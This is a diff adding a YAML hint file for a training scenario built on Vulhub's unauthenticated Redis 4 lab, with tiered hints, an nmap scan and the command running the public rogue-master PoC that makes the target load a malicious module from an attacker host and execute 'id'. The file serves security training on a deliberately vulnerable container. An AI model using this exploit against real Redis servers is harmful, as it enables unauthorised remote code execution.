@@ -1,0 +1,69 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: redis/4-unacc
+hint_levels:
+  low:
+  - Inspect the redis service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 6379. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 6379 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): redis: 6379/tcp → container 6379/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  high:
+  - 'Vulnerability: Redis Post Exploitation Due to Master and Slave Synchronisation.'
+  - |-
+    Reproduce the documented Redis module attack
+
+    Obtain the public PoC from https://github.com/vulhub/redis-rogue-getshell.
+    From that tool's checkout, use the command shown in the recipe screenshot:
+
+    ```bash
+    python redis-master.py -r {{NODE_IP}} -p 6379 -L YOUR_ATTACKER_IP -P 8888 -f RedisModulesSDK/exp.so -c "id"
+    ```
+
+    Replace YOUR_ATTACKER_IP with your reachable participant-machine IP; port 8888 is the rogue
+    replication listener on that machine, not a target scan port. The PoC makes the target replicate
+    a module, loads it, executes `id`, and restores replication settings. The screenshot shows a
+    Redis-user identity as the successful result. The tool checkout must contain or build `RedisModulesSDK/exp.so`.
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/redis/4-unacc/README.md'
+  - |-
+    Additional public references:
+    - https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf
+access_instructions:
+  title: Redis Post Exploitation Due to Master and Slave Synchronisation
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 6379. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 6379 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): redis: 6379/tcp → container 6379/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+  - title: Reproduce the documented Redis module attack
+    instructions: |-
+      Obtain the public PoC from https://github.com/vulhub/redis-rogue-getshell.
+      From that tool's checkout, use the command shown in the recipe screenshot:
+
+      ```bash
+      python redis-master.py -r {{NODE_IP}} -p 6379 -L YOUR_ATTACKER_IP -P 8888 -f RedisModulesSDK/exp.so -c "id"
+      ```
+
+      Replace YOUR_ATTACKER_IP with your reachable participant-machine IP; port 8888 is the rogue
+      replication listener on that machine, not a target scan port. The PoC makes the target replicate
+      a module, loads it, executes `id`, and restores replication settings. The screenshot shows a
+      Redis-user identity as the successful result. The tool checkout must contain or build `RedisModulesSDK/exp.so`.
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/redis/4-unacc/README.md
+  readme_sha256: 0101d07494a411dfc5609e52a04ec9040969bec6e2e2499a1364541fd1103b81
+  compose_sha256: 493cc1d4c0f712cde74670c58b7b1ccf9b45c8507c1da1ed707eb36f67f604ff
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
